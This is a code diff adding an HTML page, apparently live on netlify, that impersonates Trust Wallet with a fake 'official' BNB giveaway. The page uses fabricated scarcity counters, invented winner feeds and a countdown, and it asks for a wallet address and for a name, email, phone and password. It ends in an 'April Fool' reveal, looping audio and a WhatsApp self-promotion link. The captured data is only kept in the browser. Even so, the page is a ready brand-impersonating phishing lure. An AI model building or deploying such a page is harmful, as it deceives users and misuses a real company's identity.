@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  
+  <!-- PREMIUM META PROPERTIES -->
+  <meta name="description" content="Trust Wallet Official Gifting Event: 500 participants will receive 2.5 BNB each. Verify your wallet eligibility within 24 hours. Limited slots remaining!">
+  <meta name="keywords" content="Trust Wallet, BNB Gifting, Crypto Giveaway, Binance Smart Chain, Wallet Verification, BNB Airdrop, Free BNB, Crypto Gift">
+  <meta name="author" content="Trust Wallet Foundation">
+  <meta name="robots" content="index, follow">
+  <meta name="googlebot" content="index, follow">
+  
+  <!-- Open Graph -->
+  <meta property="og:title" content="Trust Wallet | Official BNB Gifting Event 2025 - Claim 2.5 BNB">
+  <meta property="og:description" content="Official verification portal. 500 winners. 2.5 BNB each. Limited slots remaining. Verify your wallet now and claim your gift.">
+  <meta property="og:image" content="https://vectorseek.com/wp-content/uploads/2023/05/Trust-Wallet-Logo-Vector.jpg">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Trust Wallet Gifting">
+  
+  <!-- Twitter Cards -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Trust Wallet | BNB Gifting Event - Claim 2.5 BNB">
+  <meta name="twitter:description" content="Official verification portal. 500 winners. 2.5 BNB each. Limited slots. Claim now!">
+  <meta name="twitter:image" content="https://vectorseek.com/wp-content/uploads/2023/05/Trust-Wallet-Logo-Vector.jpg">
+  
+  <title>Trust Wallet | Official BNB Gifting Event 2025 - Claim 2.5 BNB</title>
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0,1" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Inter', sans-serif; }
+    body { background: #0A0A0A; }
+    .card { background: #0F1422; border: 1px solid #1F2937; transition: all 0.3s ease; }
+    .card:hover { transform: translateY(-4px); border-color: #2E7AFE; }
+    .gradient-text { background: linear-gradient(135deg, #2E7AFE, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .progress-bar { width: 100%; height: 6px; background: #1F2937; border-radius: 10px; overflow: hidden; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, #2E7AFE, #00C49A); width: 0%; transition: width 0.05s linear; }
+    .modal { background: #0F1422; border: 1px solid #1F2937; }
+    input { background: #0A0E1A !important; border: 1px solid #1F2937 !important; color: white !important; }
+    input:focus { outline: none !important; border-color: #2E7AFE !important; }
+    
+    .april-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #0A0A0A;
+      z-index: 20000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      cursor: pointer;
+      animation: fadeInOverlay 0.5s ease;
+    }
+    @keyframes fadeInOverlay {
+      from { opacity: 0; backdrop-filter: blur(0px); }
+      to { opacity: 1; backdrop-filter: blur(20px); }
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-inline {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+
+    /* Popup styling */
+    .header-popup {
+      position: absolute;
+      top: 65px;
+      right: 20px;
+      background: #0F1422;
+      border: 1px solid #2E7AFE;
+      border-radius: 20px;
+      padding: 1rem;
+      width: 280px;
+      z-index: 1000;
+      box-shadow: 0 20px 35px -10px rgba(0,0,0,0.8);
+      backdrop-filter: blur(12px);
+    }
+    .recent-poll-item {
+      background: rgba(46, 122, 254, 0.1);
+      border-left: 3px solid #2E7AFE;
+      transition: 0.2s;
+    }
+    .volume-slider {
+      -webkit-appearance: none;
+      width: 100%;
+      height: 4px;
+      background: #2E7AFE;
+      border-radius: 5px;
+      outline: none;
+    }
+    .volume-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      width: 14px;
+      height: 14px;
+      background: white;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+    .material-symbols-rounded {
+      font-size: 20px;
+      vertical-align: middle;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="bg-[#0F1422] border-b border-gray-800 px-6 py-4 relative">
+  <div class="max-w-6xl mx-auto flex justify-between items-center">
+    <div class="flex items-center gap-3">
+      <div class="w-9 h-9 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center text-white font-bold text-xl">T</div>
+      <span class="text-xl font-bold text-white">Trust Wallet</span>
+    </div>
+    <div class="flex items-center gap-6 relative">
+      <!-- Bell Icon with popup -->
+      <div class="relative">
+        <i class="fa-regular fa-bell text-gray-400 text-xl cursor-pointer hover:text-purple-400 transition" id="bellIcon"></i>
+        <div id="bellPopup" class="header-popup hidden">
+          <div class="text-white font-bold mb-2 text-sm"><i class="fa-regular fa-bell mr-2"></i>Notifications</div>
+          <div class="text-gray-300 text-xs"><span class="material-symbols-rounded">celebration</span> New gifting event started!</div>
+          <div class="text-gray-300 text-xs mt-1"><span class="material-symbols-rounded">hourglass_empty</span> Only <span id="popupSlots">487</span> slots left</div>
+          <div class="text-gray-500 text-xs mt-2 border-t border-gray-700 pt-2"><span class="material-symbols-rounded">notifications_active</span> Stay updated</div>
+        </div>
+      </div>
+      <!-- Message Icon -->
+      <div class="relative">
+        <i class="fa-regular fa-message text-gray-400 text-xl cursor-pointer hover:text-purple-400 transition" id="msgIcon"></i>
+        <div id="msgPopup" class="header-popup hidden">
+          <div class="text-white font-bold mb-2 text-sm"><i class="fa-regular fa-message mr-2"></i>Messages</div>
+          <div class="text-gray-300 text-xs"><span class="material-symbols-rounded">forum</span> Deep Design: April fools legend!</div>
+          <div class="text-gray-300 text-xs mt-1"><span class="material-symbols-rounded">mark_as_unread</span> You have 0 unread</div>
+          <div class="text-gray-500 text-xs mt-2 border-t border-gray-700 pt-2"><span class="material-symbols-rounded">support_agent</span> Support: @trust_help</div>
+        </div>
+      </div>
+      <!-- Profile Icon -->
+      <div class="relative">
+        <div class="flex items-center gap-2 cursor-pointer" id="headerProfileBtn">
+          <i class="fa-regular fa-circle-user text-gray-400 text-2xl hover:text-purple-400"></i>
+          <span class="text-sm text-gray-300 hidden sm:inline" id="headerUserName">Guest</span>
+        </div>
+        <div id="profilePopup" class="header-popup hidden">
+          <div class="text-white font-bold mb-2 text-sm"><i class="fa-regular fa-circle-user mr-2"></i>Account</div>
+          <div id="profilePopupContent">
+            <div class="text-gray-300 text-xs"><span class="material-symbols-rounded">person_outline</span> Guest mode</div>
+            <div class="text-gray-400 text-xs mt-1">Sign in to claim BNB</div>
+            <button id="popupLoginBtn" class="mt-2 bg-blue-600 text-xs px-3 py-1 rounded-lg w-full">Login / Register</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- Main Content -->
+<div class="max-w-6xl mx-auto px-6 py-8">
+  
+  <!-- CLAIM CARD -->
+  <div class="card rounded-2xl p-6 mb-8 border-2 border-purple-500/50">
+    <div class="flex items-center justify-between flex-wrap gap-4">
+      <div>
+        <h2 class="text-2xl font-bold text-white"><span class="material-symbols-rounded text-purple-400" style="font-size: 28px;">card_giftcard</span> Claim Your 2.5 BNB Gift</h2>
+        <p class="text-gray-400 text-sm mt-1">Limited time offer - <span id="slotsLeft">487</span> slots remaining</p>
+      </div>
+      <div id="claimButtonContainer">
+        <button id="claimActionBtn" class="bg-gradient-to-r from-blue-600 to-purple-600 text-white font-bold px-8 py-3 rounded-xl hover:opacity-90 transition">
+          Claim Now
+        </button>
+      </div>
+    </div>
+    
+    <!-- Wallet Input Section -->
+    <div id="walletInputSection" class="mt-5 hidden">
+      <div class="border-t border-gray-800 pt-5">
+        <label class="block text-sm font-medium text-gray-300 mb-2">Enter your Trust Wallet address (BSC Network)</label>
+        <div class="flex gap-3 flex-wrap">
+          <input type="text" id="walletAddress" class="flex-1 rounded-xl p-3" placeholder="0x...">
+          <button id="processClaimBtn" class="bg-green-600 text-white font-semibold px-6 py-3 rounded-xl hover:bg-green-700 transition">Process Claim</button>
+        </div>
+        <p class="text-red-500 text-sm mt-2 hidden" id="walletError">Invalid wallet address (must start with 0x and be 40+ characters)</p>
+        
+        <div id="progressSection" class="mt-4 hidden">
+          <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+          <p class="text-sm text-gray-400 mt-2" id="progressMessage">Verifying wallet...</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Stats Grid -->
+  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
+    <div class="card rounded-2xl p-5 text-center"><p class="text-gray-500 text-sm">Total Prize Pool</p><p class="text-2xl font-bold text-white mt-1">1,250 BNB</p></div>
+    <div class="card rounded-2xl p-5 text-center"><p class="text-gray-500 text-sm">Winners</p><p class="text-2xl font-bold text-white mt-1">500</p></div>
+    <div class="card rounded-2xl p-5 text-center"><p class="text-gray-500 text-sm">Your Status</p><p class="text-2xl font-bold text-white mt-1" id="statusText">Not Claimed</p></div>
+    <div class="card rounded-2xl p-5 text-center"><p class="text-gray-500 text-sm">Ends In</p><p class="text-2xl font-bold text-purple-400 mt-1" id="countdown">23:59:59</p></div>
+  </div>
+
+  <!-- TradingView Chart -->
+  <div class="card rounded-2xl p-4 mb-8">
+    <div class="tradingview-widget-container">
+      <div class="tradingview-widget-container__widget"></div>
+      <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js" async>
+      {
+        "allow_symbol_change": true, "calendar": false, "details": false, "hide_side_toolbar": true,
+        "hide_top_toolbar": false, "interval": "D", "locale": "en", "symbol": "CRYPTOCAP:BNB",
+        "theme": "dark", "backgroundColor": "#0F1422", "gridColor": "rgba(242, 242, 242, 0.06)",
+        "width": "100%", "height": 400
+      }
+      </script>
+    </div>
+  </div>
+
+  <!-- Two Column Layout: Recent Winners + Official Support (BELOW CHART) -->
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+    <!-- Recent Winners Poll -->
+    <div class="card rounded-2xl p-5">
+      <div class="flex items-center gap-2 mb-4"><span class="material-symbols-rounded text-yellow-500">emoji_events</span><h3 class="font-bold text-white text-lg">Recent Gifts Received</h3></div>
+      <div id="recentPollList" class="space-y-2 max-h-48 overflow-y-auto pr-1">
+        <!-- dynamic random entries -->
+      </div>
+      <p class="text-gray-500 text-xs mt-3 italic"><span class="material-symbols-rounded" style="font-size: 12px;">autorenew</span> Live verified participants</p>
+    </div>
+    
+    <!-- Message Section - contact admin & share link -->
+    <div class="card rounded-2xl p-5">
+      <div class="flex items-center gap-2 mb-3"><span class="material-symbols-rounded text-purple-400">support_agent</span><h3 class="font-bold text-white text-lg">Official Support</h3></div>
+      <p class="text-gray-300 text-sm mb-3">Having issues? Reach out to our gift manager.</p>
+      <div class="bg-black/40 rounded-xl p-3 mb-3">
+        <p class="text-gray-400 text-xs mb-1"><span class="material-symbols-rounded" style="font-size: 12px;">share</span> Share this event & earn bonus</p>
+        <div class="flex gap-2">
+          <input type="text" id="shareLinkInput" readonly value="https://trust-gifting.netlify.app" class="text-xs flex-1 rounded-lg p-2 bg-gray-900">
+          <button id="copyLinkBtn" class="bg-gray-700 hover:bg-purple-600 text-white text-xs px-3 rounded-lg transition"><span class="material-symbols-rounded" style="font-size: 14px;">content_copy</span> Copy</button>
+        </div>
+      </div>
+      <button id="contactAdminBtn" class="w-full bg-green-700 hover:bg-green-600 text-white font-semibold py-2 rounded-xl transition flex items-center justify-center gap-2"><i class="fab fa-whatsapp"></i> Contact Admin (WhatsApp)</button>
+    </div>
+  </div>
+
+  <!-- Info Cards -->
+  <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+    <div class="card rounded-2xl p-6"><span class="material-symbols-rounded text-purple-400 text-3xl">verified</span><h3 class="font-semibold text-white mb-2 mt-2">Secure Verification</h3><p class="text-gray-400 text-sm">Your wallet is safe with Trust Wallet's secure system</p></div>
+    <div class="card rounded-2xl p-6"><span class="material-symbols-rounded text-purple-400 text-3xl">hourglass_top</span><h3 class="font-semibold text-white mb-2 mt-2">Limited Time</h3><p class="text-gray-400 text-sm">Only <span id="slotsInfo">487</span> slots remaining</p></div>
+    <div class="card rounded-2xl p-6"><span class="material-symbols-rounded text-purple-400 text-3xl">bolt</span><h3 class="font-semibold text-white mb-2 mt-2">Instant Transfer</h3><p class="text-gray-400 text-sm">Gift sent directly to your Trust Wallet</p></div>
+  </div>
+</div>
+
+<footer class="bg-[#0F1422] border-t border-gray-800 py-6 px-6 mt-12">
+  <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center text-sm text-gray-500">
+    <p>© 2025 Trust Wallet Foundation. All rights reserved.</p>
+    <div class="flex gap-6 mt-4 md:mt-0"><a href="#" class="hover:text-purple-400">Privacy</a><a href="#" class="hover:text-purple-400">Terms</a><a href="#" class="hover:text-purple-400">Contact</a></div>
+  </div>
+</footer>
+
+<!-- Login Modal -->
+<div id="loginModal" class="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center hidden">
+  <div class="modal rounded-3xl p-8 max-w-md w-full mx-4">
+    <div class="flex justify-between items-center mb-6"><h2 class="text-2xl font-bold text-white" id="modalTitle">Welcome Back</h2><i class="fa-solid fa-times cursor-pointer text-gray-400 hover:text-white text-xl" onclick="closeModal()"></i></div>
+    <div id="loginFormDiv">
+      <div class="mb-4"><label class="block text-sm font-medium text-gray-300 mb-1">Email</label><input type="email" id="loginEmail" class="w-full rounded-xl p-3"></div>
+      <div class="mb-6"><label class="block text-sm font-medium text-gray-300 mb-1">Password</label><input type="password" id="loginPassword" class="w-full rounded-xl p-3"></div>
+      <button onclick="handleLogin()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 rounded-xl font-semibold">Sign In</button>
+      <p class="text-center mt-4 text-sm text-gray-400">No account? <span class="text-purple-400 cursor-pointer" onclick="showRegister()">Create one</span></p>
+    </div>
+    <div id="registerFormDiv" style="display:none;">
+      <div class="mb-3"><label class="block text-sm font-medium text-gray-300 mb-1">Full Name</label><input type="text" id="regName" class="w-full rounded-xl p-3"></div>
+      <div class="mb-3"><label class="block text-sm font-medium text-gray-300 mb-1">Email</label><input type="email" id="regEmail" class="w-full rounded-xl p-3"></div>
+      <div class="mb-3"><label class="block text-sm font-medium text-gray-300 mb-1">Phone</label><input type="tel" id="regPhone" class="w-full rounded-xl p-3"></div>
+      <div class="mb-4"><label class="block text-sm font-medium text-gray-300 mb-1">Password</label><input type="password" id="regPassword" class="w-full rounded-xl p-3"></div>
+      <button onclick="handleRegister()" class="w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-3 rounded-xl font-semibold">Create Account</button>
+      <p class="text-center mt-4 text-sm text-gray-400">Already have an account? <span class="text-purple-400 cursor-pointer" onclick="showLogin()">Sign In</span></p>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ---------- STATE ----------
+  let currentUser = null;
+  let hasClaimed = false;
+  let isPranked = localStorage.getItem('isPranked') === 'true';
+  let audioCtx = null;
+  let gainNode = null;
+  let sourceNode = null;
+  let fakeSlots = parseInt(localStorage.getItem('fakeSlots')) || 487;
+  let countdownSeconds = 86400;
+
+  // Update slots display & persist
+  function updateSlotsUI() {
+    document.getElementById('slotsLeft').innerHTML = fakeSlots;
+    document.getElementById('slotsInfo').innerHTML = fakeSlots;
+    document.getElementById('popupSlots').innerHTML = fakeSlots;
+    localStorage.setItem('fakeSlots', fakeSlots);
+  }
+  updateSlotsUI();
+
+  // Countdown timer
+  setInterval(() => {
+    if (countdownSeconds > 0 && !isPranked) {
+      countdownSeconds--;
+      const hours = Math.floor(countdownSeconds / 3600);
+      const mins = Math.floor((countdownSeconds % 3600) / 60);
+      const secs = countdownSeconds % 60;
+      document.getElementById('countdown').innerHTML = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    }
+  }, 1000);
+  
+  // Fake slots decreasing
+  setInterval(() => {
+    if (fakeSlots > 0 && !isPranked) {
+      fakeSlots--;
+      updateSlotsUI();
+    }
+  }, 18000);
+  
+  // Recent Activity Poll: random users who "received gift"
+  const fakeNames = ["0x7aB...c3F", "0x2Ef...9aA", "0x9cD...bB1", "0xF11...7eD", "0x34a...8fG", "0x8bE...2Hj", "LunarTrader", "CryptoZen", "BNB_Holder", "DeFi_Warrior"];
+  function updateRecentPoll() {
+    const container = document.getElementById('recentPollList');
+    if (!container) return;
+    const shuffled = [...fakeNames].sort(() => 0.5 - Math.random());
+    const recentItems = shuffled.slice(0, 5).map(name => {
+      const timeAgo = Math.floor(Math.random() * 30) + 1;
+      return `<div class="recent-poll-item p-2 rounded-lg text-xs flex justify-between"><span class="text-purple-300 font-mono">${name}</span><span class="text-green-400">+2.5 BNB</span><span class="text-gray-500">${timeAgo} min ago</span></div>`;
+    }).join('');
+    container.innerHTML = recentItems;
+  }
+  updateRecentPoll();
+  setInterval(updateRecentPoll, 14000);
+
+  // Pranked persistence on page refresh
+  if (isPranked) {
+    document.getElementById('statusText').innerHTML = 'Pranked';
+    document.getElementById('claimActionBtn').innerHTML = 'April Fool';
+    document.getElementById('claimActionBtn').disabled = true;
+    if(document.getElementById('walletInputSection')) document.getElementById('walletInputSection').classList.add('hidden');
+  }
+  
+  // Load user
+  const savedUser = localStorage.getItem('currentUser');
+  if (savedUser && !isPranked) {
+    currentUser = JSON.parse(savedUser);
+    document.getElementById('headerUserName').innerHTML = currentUser.name.split(' ')[0];
+    document.getElementById('statusText').innerHTML = 'Ready';
+    document.getElementById('walletInputSection').classList.remove('hidden');
+    document.getElementById('claimActionBtn').innerHTML = 'Enter Wallet Address';
+  }
+  
+  // ----- AUDIO: endless, volume adjustable, cannot stop
+  function initEndlessAudio() {
+    if (audioCtx) return;
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    gainNode = audioCtx.createGain();
+    gainNode.gain.value = 0.7;
+    const sampleRate = audioCtx.sampleRate;
+    const bufferSize = sampleRate * 2;
+    const buffer = audioCtx.createBuffer(1, bufferSize, sampleRate);
+    const data = buffer.getChannelData(0);
+    const freqs = [523.25, 659.25, 783.99, 587.33, 659.25, 523.25, 783.99, 880];
+    for (let i = 0; i < bufferSize; i++) {
+      const t = i / sampleRate;
+      const freq = freqs[Math.floor(t * 4) % freqs.length];
+      data[i] = Math.sin(2 * Math.PI * freq * t) * 0.35;
+    }
+    sourceNode = audioCtx.createBufferSource();
+    sourceNode.buffer = buffer;
+    sourceNode.loop = true;
+    sourceNode.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+    audioCtx.resume().then(() => sourceNode.start());
+    
+    // Volume control slider
+    const volumeSlider = document.createElement('input');
+    volumeSlider.type = 'range';
+    volumeSlider.min = 0;
+    volumeSlider.max = 1;
+    volumeSlider.step = 0.01;
+    volumeSlider.value = 0.7;
+    volumeSlider.classList.add('volume-slider', 'w-24', 'h-1', 'ml-2');
+    volumeSlider.addEventListener('input', (e) => { if(gainNode) gainNode.gain.value = parseFloat(e.target.value); });
+    const audioControlDiv = document.createElement('div');
+    audioControlDiv.className = 'fixed bottom-4 right-4 z-[20000] bg-black/70 backdrop-blur rounded-full px-3 py-2 flex items-center gap-2 text-xs text-white';
+    audioControlDiv.innerHTML = `<span class="material-symbols-rounded" style="font-size: 16px;">volume_up</span><span>Volume</span>`;
+    audioControlDiv.appendChild(volumeSlider);
+    document.body.appendChild(audioControlDiv);
+  }
+  
+  // Show April Fool overlay + WhatsApp includes site link
+  function showAprilFool() {
+    if (isPranked) return;
+    const firstName = currentUser ? currentUser.name.split(' ')[0] : 'there';
+    const phoneNumber = '2349051566260';
+    const whatsappMessage = `Hi Deep Design, my name is ${firstName}. I saw your professional portfolio prank and I'm impressed. Please save my contact. I am looking forward to working with you on web development and graphic design. PS: Trust Wallet prank site: ${window.location.href}`;
+    const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(whatsappMessage)}`;
+    
+    const overlayHtml = `
+      <div class="april-overlay" id="aprilOverlay">
+        <div style="max-width: 600px; padding: 60px 40px; text-align: center;">
+          <div style="font-size: clamp(4rem, 15vw, 10rem); font-weight: 900; line-height: 0.95; color: #FFFFFF; text-transform: uppercase; letter-spacing: -0.01em; text-shadow: 0 0 60px rgba(255, 60, 60, 0.6); margin-bottom: 16px;">APRIL</div>
+          <div style="font-size: clamp(4rem, 15vw, 10rem); font-weight: 900; line-height: 0.95; color: #FF3B30; text-transform: uppercase; letter-spacing: -0.01em; text-shadow: 0 0 60px rgba(255, 60, 60, 0.8); margin-bottom: 32px;">FOOL</div>
+          <div style="width: clamp(120px, 30vw, 300px); height: 2px; background: linear-gradient(90deg, transparent, rgba(255, 60, 60, 0.8), transparent); margin: 32px auto;"></div>
+          <div style="font-size: clamp(1rem, 2.5vw, 1.3rem); color: rgba(255, 200, 200, 0.7); letter-spacing: 0.12em; text-transform: uppercase; margin: 24px 0;">You just got pranked by Deep Design</div>
+          <div style="font-size: clamp(0.8rem, 1.6vw, 1rem); color: rgba(255, 200, 200, 0.35); letter-spacing: 0.15em; text-transform: uppercase; margin: 16px 0;">BNB Gifting Event was never real</div>
+          <div style="margin-top: 40px; padding: 14px 32px; border: 1px solid rgba(255, 60, 60, 0.3); border-radius: 4px; color: rgba(255, 120, 120, 0.8); font-size: 0.8rem; letter-spacing: 0.2em; text-transform: uppercase; box-shadow: 0 0 46px rgba(255, 60, 60, 0.46); display: inline-block;">🔊 Sound cannot be stopped — April Fools</div>
+          <div style="font-size: 12px; color: #6B7280; margin-top: 60px; letter-spacing: 2px;">Click to contact Deep Design on WhatsApp & share site</div>
+        </div>
+      </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', overlayHtml);
+    document.getElementById('aprilOverlay').addEventListener('click', function() {
+      window.open(whatsappUrl, '_blank');
+      this.remove();
+    });
+  }
+  
+  // Process claim => triggers prank + endless audio
+  document.getElementById('processClaimBtn').onclick = () => {
+    if (hasClaimed || isPranked) { showAprilFool(); return; }
+    const wallet = document.getElementById('walletAddress').value;
+    if (!wallet || wallet.length < 40 || !wallet.startsWith('0x')) {
+      document.getElementById('walletError').classList.remove('hidden');
+      return;
+    }
+    document.getElementById('walletError').classList.add('hidden');
+    const progressSection = document.getElementById('progressSection');
+    const progressFill = document.getElementById('progressFill');
+    const progressMessage = document.getElementById('progressMessage');
+    const processBtn = document.getElementById('processClaimBtn');
+    progressSection.classList.remove('hidden');
+    processBtn.disabled = true;
+    processBtn.innerHTML = '<span class="loader-inline"></span> Processing';
+    let progress = 0;
+    const messages = ['Verifying wallet...', 'Checking eligibility...', 'Confirming transaction...', 'Finalizing gift transfer...'];
+    let msgIndex = 0;
+    const msgInterval = setInterval(() => { progressMessage.innerHTML = messages[msgIndex % messages.length]; msgIndex++; }, 800);
+    const interval = setInterval(() => {
+      progress += Math.random() * 15 + 5;
+      if (progress >= 100) {
+        clearInterval(interval); clearInterval(msgInterval);
+        hasClaimed = true;
+        localStorage.setItem('isPranked', 'true');
+        isPranked = true;
+        initEndlessAudio();
+        showAprilFool();
+      }
+      progressFill.style.width = progress + '%';
+    }, 100);
+  };
+  
+  // Header Popups Logic
+  const bellPopup = document.getElementById('bellPopup');
+  const msgPopup = document.getElementById('msgPopup');
+  const profilePopup = document.getElementById('profilePopup');
+  document.getElementById('bellIcon').addEventListener('click', (e) => { e.stopPropagation(); bellPopup.classList.toggle('hidden'); msgPopup.classList.add('hidden'); profilePopup.classList.add('hidden'); });
+  document.getElementById('msgIcon').addEventListener('click', (e) => { e.stopPropagation(); msgPopup.classList.toggle('hidden'); bellPopup.classList.add('hidden'); profilePopup.classList.add('hidden'); });
+  document.getElementById('headerProfileBtn').addEventListener('click', (e) => { e.stopPropagation(); profilePopup.classList.toggle('hidden'); bellPopup.classList.add('hidden'); msgPopup.classList.add('hidden'); });
+  document.getElementById('popupLoginBtn')?.addEventListener('click', () => { openLoginModal(); profilePopup.classList.add('hidden'); });
+  window.addEventListener('click', () => { bellPopup?.classList.add('hidden'); msgPopup?.classList.add('hidden'); profilePopup?.classList.add('hidden'); });
+  
+  // Copy link & contact admin
+  document.getElementById('copyLinkBtn')?.addEventListener('click', () => {
+    const input = document.getElementById('shareLinkInput');
+    input.select(); document.execCommand('copy');
+    alert('Site link copied! Share with friends.');
+  });
+  document.getElementById('contactAdminBtn')?.addEventListener('click', () => {
+    const phone = '2349051566260';
+    const msg = `Hello Deep Design, I need help with Trust Wallet gifting event. Site: ${window.location.href}`;
+    window.open(`https://wa.me/${phone}?text=${encodeURIComponent(msg)}`, '_blank');
+  });
+  
+  // Claim action button
+  document.getElementById('claimActionBtn').onclick = () => {
+    if (isPranked) { showAprilFool(); return; }
+    if (currentUser) document.getElementById('walletInputSection').scrollIntoView({ behavior: 'smooth' });
+    else openLoginModal();
+  };
+  
+  // Auth functions
+  function openLoginModal() { document.getElementById('loginModal').classList.remove('hidden'); }
+  window.closeModal = () => document.getElementById('loginModal').classList.add('hidden');
+  window.showRegister = () => { document.getElementById('loginFormDiv').style.display = 'none'; document.getElementById('registerFormDiv').style.display = 'block'; document.getElementById('modalTitle').innerText = 'Create Account'; };
+  window.showLogin = () => { document.getElementById('registerFormDiv').style.display = 'none'; document.getElementById('loginFormDiv').style.display = 'block'; document.getElementById('modalTitle').innerText = 'Welcome Back'; };
+  window.handleRegister = () => {
+    const name = document.getElementById('regName').value, email = document.getElementById('regEmail').value, phone = document.getElementById('regPhone').value, password = document.getElementById('regPassword').value;
+    if (!name || !email || !phone || !password) { alert('Fill all fields'); return; }
+    currentUser = { name, email, phone, password };
+    localStorage.setItem('currentUser', JSON.stringify(currentUser));
+    document.getElementById('headerUserName').innerHTML = currentUser.name.split(' ')[0];
+    document.getElementById('statusText').innerHTML = 'Ready';
+    document.getElementById('walletInputSection').classList.remove('hidden');
+    document.getElementById('claimActionBtn').innerHTML = 'Enter Wallet Address';
+    closeModal();
+  };
+  window.handleLogin = () => {
+    const email = document.getElementById('loginEmail').value, password = document.getElementById('loginPassword').value;
+    const saved = localStorage.getItem('currentUser');
+    if (!saved) { alert('No account found'); showRegister(); return; }
+    const user = JSON.parse(saved);
+    if (user.email === email && user.password === password) {
+      currentUser = user;
+      document.getElementById('headerUserName').innerHTML = currentUser.name.split(' ')[0];
+      document.getElementById('statusText').innerHTML = 'Ready';
+      document.getElementById('walletInputSection').classList.remove('hidden');
+      document.getElementById('claimActionBtn').innerHTML = 'Enter Wallet Address';
+      closeModal();
+    } else alert('Invalid credentials');
+  };
+  
+  // Update profile popup content based on login
+  function refreshProfilePopup() {
+    const popupContent = document.getElementById('profilePopupContent');
+    if (currentUser) popupContent.innerHTML = `<div class="text-gray-200 text-xs"><span class="material-symbols-rounded" style="font-size: 14px;">account_circle</span> ${currentUser.name}</div><div class="text-gray-400 text-xs">${currentUser.email}</div><button id="popupLogoutBtn" class="mt-2 bg-red-700 text-xs px-3 py-1 rounded-lg w-full">Logout</button>`;
+    else popupContent.innerHTML = `<div class="text-gray-300 text-xs"><span class="material-symbols-rounded" style="font-size: 14px;">person_outline</span> Guest mode</div><div class="text-gray-400 text-xs mt-1">Sign in to claim BNB</div><button id="popupLoginBtn" class="mt-2 bg-blue-600 text-xs px-3 py-1 rounded-lg w-full">Login / Register</button>`;
+    document.getElementById('popupLoginBtn')?.addEventListener('click', () => { openLoginModal(); profilePopup.classList.add('hidden'); });
+    document.getElementById('popupLogoutBtn')?.addEventListener('click', () => { localStorage.removeItem('currentUser'); location.reload(); });
+  }
+  setInterval(refreshProfilePopup, 500);
+  refreshProfilePopup();
+</script>
+</body>
+</html>
